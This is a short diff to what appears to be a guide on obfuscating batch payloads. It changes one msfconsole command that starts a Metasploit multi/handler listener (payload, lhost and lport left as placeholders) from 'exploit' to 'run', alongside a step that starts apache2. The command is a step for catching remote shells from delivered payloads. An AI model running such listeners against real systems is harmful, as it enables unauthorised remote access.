@@ -192,7 +192,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
       service apache2 start
 
       3º - Start your agent listenner (handler)
-      msfconsole -x 'use exploit/multi/hadler; set payload <payload>; set lhost <lhost>; set lport <lport>; exploit'
+      msfconsole -x 'use exploit/multi/hadler; set payload <payload>; set lhost <lhost>; set lport <lport>; run'
 
 <br />
 
